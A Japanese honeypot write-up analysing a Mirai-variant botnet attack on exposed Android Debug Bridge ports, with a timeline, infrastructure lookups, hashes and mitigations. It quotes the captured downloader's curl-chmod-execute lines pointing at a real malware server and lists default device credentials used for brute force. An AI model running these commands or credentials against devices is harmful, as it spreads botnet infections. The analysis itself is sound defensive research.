家で運用している[T-Pod]()の[ADBハニーポット](https://github.com/huuck/ADBHoney)で観測された攻撃についての分析
この攻撃は、わずか45秒という短時間で複数のマルウェアをダウンロード・実行する自動化された攻撃であり、Mirai亜種の特徴を持つボットネット感染攻撃だと考えられる。

攻撃概要
- 観測日時: 2025年8月18日 02:24:21 UTC
- 攻撃継続時間: 45.54秒
- 攻撃元: 176.65.148.200 (ドイツ)
- 標的ポート: TCP/5555 (Android Debug Bridge)

## 攻撃ログ
![](https://i.imgur.com/AuUSRDG.png)


## 攻撃の概要
- 今回観測された攻撃、Android Debug Bridge（ADB）ポート 5555番を標的とした自動化されたマルウェア配布攻撃
- 攻撃者は複数のダウンローダースクリプトを使用し、最終的に12種類のCPUアーキテクチャに対応したマルウェアバイナリを配布している

攻撃の特徴
- 完全自動化
- 複数のダウンロード手法による冗長化
- 幅広いアーキテクチャ対応による感染範囲の最大化
- Mirai系亜種ボットネットの典型的な文字列


## 攻撃の流れ

### タイムライン
- 攻撃は以下の時系列で実行された

| 時刻 (UTC)     | イベント        | 詳細             |
| ------------ | ----------- | -------------- |
| 02:24:21.481 | ADB接続開始     | TCP/5555への初期接続 |
| 02:24:21.836 | コマンド実行      | 複合コマンドライン実行    |
| 02:24:22.133 | wayne.sh取得  | 第一ダウンローダーの取得   |
| 02:24:22.284 | carlo.sh取得  | 第二ダウンローダーの取得   |
| 02:24:22.434 | adb.sh取得(1) | メインダウンローダーの取得  |
| 02:24:22.577 | adb.sh取得(2) | 冗長化による再取得      |
| 02:24:22.716 | adb.sh取得(3) | 冗長化による再取得      |
| 02:24:22.860 | adb.sh取得(4) | 冗長化による再取得      |
| 02:25:07.016 | セッション終了     | 45.54秒後に切断     |


このコマンドから考えられること

- 作業ディレクトリの設定: `/data/local/tmp/`（書き込み可能な一時領域）
- ツールの多重化: wget, curl, busybox variantsの併用・冗長性
- 即時実行: ダウンロード後の即座のスクリプト実行
- 冗長化: adb.shの4回重複実行による確実性の担保

## 攻撃インフラ
### 攻撃元 (176.65.148.200)
- https://www.shodan.io/host/176.65.148.200
- プロバイダー: Pfcloud UG (ドイツ)
- 脆弱性: SSH関連CVE 多数
```sh
shodan host 176.65.148.200
176.65.148.200
Hostnames:               hosted-by.pfcloud.io
City:                    Aachen
Country:                 Germany
Organization:            Pfcloud UG
Updated:                 2025-08-10T05:00:35.045740
Number of open ports:    1
Vulnerabilities:         CVE-2023-51385	CVE-2016-20012	CVE-2018-15919	CVE-2017-15906	CVE-2021-36368	CVE-2025-26465	CVE-2023-51767	CVE-2018-20685	CVE-2018-15473	CVE-2020-14145	CVE-2020-15778	CVE-2023-48795	CVE-2023-38408	CVE-2007-2768	CVE-2008-3844	CVE-2019-6111	CVE-2019-6110	CVE-2021-41617	CVE-2025-32728	CVE-2019-6109

Ports:
     22/tcp OpenSSH (7.4)
```

### C&Cサーバー (209.141.32.42)
- https://en.fofa.info/result?qbase64=MjA5LjE0MS4zMi40Mg%3D%3D
- プロバイダー: FranTech Solutions (米国)
- 脆弱性: Apache関連CVE 90件以上
- 状態: 設定不備によりテストページが公開
```sh
shodan host 209.141.32.42
209.141.32.42
Hostnames:               LAS.BBKEN.NET
City:                    Paradise
Country:                 United States
Organization:            FranTech Solutions
Updated:                 2025-08-14T12:46:49.008473
Number of open ports:    2
Vulnerabilities:         CVE-2014-0117	CVE-2017-7679	CVE-2017-9798	CVE-2015-3185	CVE-2015-3184	CVE-2015-3183	CVE-2013-4365	CVE-2022-28330	CVE-2021-32791	CVE-2021-32792	CVE-2023-31122	CVE-2024-38476	CVE-2024-38477	CVE-2024-38474	CVE-2024-38475	CVE-2024-38472	CVE-2024-38473	CVE-2009-0796	CVE-2014-0118	CVE-2022-31813	CVE-2020-1927	CVE-2011-2688	CVE-2017-3167	CVE-2023-38709	CVE-2021-32786	CVE-2021-32785	CVE-2007-4723	CVE-2021-44790	CVE-2016-4975	CVE-2020-13938	CVE-2020-35452	CVE-2022-22719	CVE-2024-47252	CVE-2020-1934	CVE-2021-34798	CVE-2019-0217	CVE-2024-24795	CVE-2014-3523	CVE-2013-5704	CVE-2019-17567	CVE-2013-6438	CVE-2024-42516	CVE-2012-4360	CVE-2014-0231	CVE-2024-39573	CVE-2021-26690	CVE-2021-26691	CVE-2019-0220	CVE-2025-49812	CVE-2022-30556	CVE-2021-39275	CVE-2014-3581	CVE-2016-0736	CVE-2022-29404	CVE-2018-1312	CVE-2006-20001	CVE-2019-10092	CVE-2014-0226	CVE-2022-22721	CVE-2022-22720	CVE-2017-15710	CVE-2017-15715	CVE-2019-10098	CVE-2016-5387	CVE-2021-40438	CVE-2011-1176	CVE-2022-23943	CVE-2018-17199	CVE-2018-1301	CVE-2018-1302	CVE-2018-1303	CVE-2022-36760	CVE-2023-25690	CVE-2020-11985	CVE-2013-4352	CVE-2022-26377	CVE-2014-0098	CVE-2016-8743	CVE-2024-40898	CVE-2024-43204	CVE-2012-3526	CVE-2016-8612	CVE-2009-2299	CVE-2012-4001	CVE-2022-37436	CVE-2017-9788	CVE-2014-8109	CVE-2013-2765	CVE-2024-43394	CVE-2016-2161	CVE-2015-0228	CVE-2013-0941	CVE-2013-0942	CVE-2018-1283	CVE-2022-28615	CVE-2022-28614

Ports:
     22/tcp OpenSSH (9.6p1 Ubuntu 3ubuntu13.13)
     80/tcp Apache httpd (2.4.6)
	|-- HTTP title: Apache HTTP Server Test Page powered by CentOS
```
### マルウェア配信サーバー (23.146.184.21)
Fofa 
- https://en.fofa.info/result?qbase64=MjMuMTQ2LjE4NC4yMQ%3D%3D

基本情報
- サーバーがある場所: Chicago, United States
- 組織: [ATOMIC-NETWORKS-1](https://atomicnetworks.co/) (ASN: 399820)
- Webサーバー: Apache/2.4.58 (Ubuntu)

実際に配信サーバーにアクセスできる
- http[:]//23.146[.]184.21/
	- ダウンローダーの配布

![](https://i.imgur.com/OQkvPYI.png)

http[:]//23.146[.]184.21/bins/
- 12種類のアーキテクチャ固有バイナリ
- サイズ範囲: 67K - 170K
- 命名規則: systemd.[architecture]

![](https://i.imgur.com/qKnv0xx.png)




## ダウンローダー
### VirusTotalでの検索
- https://www.virustotal.com/gui/file/42f2ef51bd75c0ae260ae9e1cd2221ed13c702cce12a242a8cc277fd157b17f9
- https://www.virustotal.com/gui/file/cdb35d1d917f58cc22c09d3f0c060b5deae9fd75d89b076af00a6ec52f9accc3
- https://www.virustotal.com/gui/file/5b9210db87cfb74d5a953470ac82b04621cf663632b8f37a000f2aa88f103869

### スクリプト
観測された3つのスクリプト（wayne.sh, carlo.sh, adb.sh）は、基本的に同一の機能を異なるツールで実装している

共通実行パターン
```bash
[download_tool] http[:]//23.146[.]184.21/bins/systemd.[arch]
chmod 777 systemd.[arch]
./systemd.[arch] systemctl[arch_suffix]
```

ツール別実装:
- wayne.sh: `busybox wget`を使用
- carlo.sh: `curl`を使用
- adb.sh: `wget`を使用
この設計によって、環境の制約に関係なく確実にペイロードがダウンロードされるようにしていると考えられる。

wayne.shでの例
```sh
curl http[:]//23.146[.]184.21/bins/systemd.arm; chmod 777 systemd.arm; ./systemd.arm systemctlarm
curl http[:]//23.146[.]184.21/bins/systemd.arm5; chmod 777 systemd.arm5; ./systemd.arm5 systemctlarm5
curl http[:]//23.146[.]184.21/bins/systemd.arm6; chmod 777 systemd.arm6; ./systemd.arm6 systemctlarm6
curl http[:]//23.146[.]184.21/bins/systemd.arm7; chmod 777 systemd.arm7; ./systemd.arm7 systemctlarm7
curl http[:]//23.146[.]184.21/bins/systemd.m68k; chmod 777 systemd.m68k; ./systemd.m68k systemctl
curl http[:]//23.146[.]184.21/bins/systemd.mips; chmod 777 systemd.mips; ./systemd.mips systemctlmips
curl http[:]//23.146[.]184.21/bins/systemd.mpsl; chmod 777 systemd.mpsl; ./systemd.mpsl systemctlmpsl
curl http[:]//23.146[.]184.21/bins/systemd.ppc; chmod 777 systemd.ppc; ./systemd.ppc systemctl
curl http[:]//23.146[.]184.21/bins/systemd.sh4; chmod 777 systemd.sh4; ./systemd.sh4 systemctl
curl http[:]//23.146[.]184.21/bins/systemd.spc; chmod 777 systemd.spc; ./systemd.spc systemctl
curl http[:]//23.146[.]184.21/bins/systemd.x86; chmod 777 systemd.x86; ./systemd.x86 systemctlx86
curl http[:]//23.146[.]184.21/bins/systemd.x86_64; chmod 777 systemd.x86_64; ./systemd.x86_64 systemctlx86_64

rm $0

```


## バイナリファイル
- ダウンローダーによってダウンロードされたもの

VirusTotalでは、アンチマルウェアソフトによって、Miraiの亜種であると判定されている
- https://www.virustotal.com/gui/file/c13a54474e5d2361a52e3ec958d5e067d2502ac2ab31098dfce99a3e1c0e34a2

![](https://i.imgur.com/RCYMF16.png)


### 表層解析
- systemd.armファイル
	- ネットワーク機能
		- HTTP通信: `POST /cdn-cgi/` (CDN偽装)
		- UPnP/SSDP探索機能
		- 豊富なネットワークライブラリ関数
	- 認証情報（ブルートフォース用）
		- デフォルト認証情報を狙ったもの: admin, root, user, guest,...
		- デフォルト認証情報に2024、24を末尾につけたもの: Passw0rd2024, Admin2024!, Welcome2024,...
		- デバイス固有: xc3511, admin@9000,...

デバイス固有の認証情報とは
- xc3511
	- Xiongmai製の防犯カメラのデフォルト認証情報
	- root : xc3511
	- https://www.itmedia.co.jp/enterprise/articles/1610/25/news059.html
- admin@9000
	- Huweiネットワーク製品
	- https://info.support.huawei.com/hedex/api/pages/EDOC1000053358/YEF0907R/25/resources/en-us_topic_0000001990690949.html


C&C通信
- C&Cサーバー: 209.141.32.42
- Shodanではなかったので、FoFaを使用
	- https://en.fofa.info/result?qbase64=MjA5LjE0MS4zMi40Mg%3D%3D

Mirai亜種に含まれると考えられる典型的な文字列の一部が確認できる
```
Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS
```
- https://www.radware.com/security/ddos-threats-attacks/threat-advisories-attack-reports/hoaxcalls-evolution/
- https://isc.sans.edu/diary/26638
- https://cujo.com/blog/mirai-gafgyt-with-new-ddos-modules-discovered/


## VirusTotalでの検索

| ファイル     | SHA256                                                           | 検出率           | 主要分類                     |     |
| -------- | ---------------------------------------------------------------- | ------------- | ------------------------ | --- |
| wayne.sh | 42f2ef51bd75c0ae260ae9e1cd2221ed13c702cce12a242a8cc277fd157b17f9 | 20/47 (42.6%) | Downloader/Shell.Generic |     |
| carlo.sh | cdb35d1d917f58cc22c09d3f0c060b5deae9fd75d89b076af00a6ec52f9accc3 | 27/62 (43.5%) | Downloader/BASH/Mirai    |     |
| adb.sh   | 5b9210db87cfb74d5a953470ac82b04621cf663632b8f37a000f2aa88f103869 | 18/61 (29.5%) | Downloader/BASH/Mirai    |     |



## 対策
ADBセキュリティの強化
- ADBデバッグモードの無効化（開発用途以外）
	- 有効にしたとしても、TCP/5555ポートは外部に公開しない
	- ネットワークレベルでのアクセス制御
## まとめ

- 今回観測された攻撃は、ADBポートを標的としたMirai亜種によるボットネット構築攻撃であると考えられる
- 攻撃の特徴として、高度な自動化、冗長化戦略、幅広いアーキテクチャ対応がある
- 攻撃元、C&Cサーバ、マルウェア配信サーバー、全てに言えることだが、これらが攻撃者のものなのか侵害されたものなのかの区別がつかないなと思った

## 参考文献
ダウンローダーのVirustotal
- https://www.virustotal.com/gui/file/42f2ef51bd75c0ae260ae9e1cd2221ed13c702cce12a242a8cc277fd157b17f9
- https://www.virustotal.com/gui/file/cdb35d1d917f58cc22c09d3f0c060b5deae9fd75d89b076af00a6ec52f9accc3
- https://www.virustotal.com/gui/file/5b9210db87cfb74d5a953470ac82b04621cf663632b8f37a000f2aa88f103869

バイナリファイルのVirusTotal
- https://www.virustotal.com/gui/file/c13a54474e5d2361a52e3ec958d5e067d2502ac2ab31098dfce99a3e1c0e34a2

攻撃インフラのShodan・Fofa
- C&Cサーバー: 209.141.32.42
	- https://www.shodan.io/host/209.141.32.42
- マルウェア配信サーバー : 23.146.184.21
	- https://en.fofa.info/result?qbase64=MjMuMTQ2LjE4NC4yMQ%3D%3D
- 攻撃元 : 176.65.148.200
	- https://www.shodan.io/host/176.65.148.200

Mirai亜種に関する文献
- https://www.radware.com/security/ddos-threats-attacks/threat-advisories-attack-reports/hoaxcalls-evolution/
- https://isc.sans.edu/diary/26638
- https://cujo.com/blog/mirai-gafgyt-with-new-ddos-modules-discovered/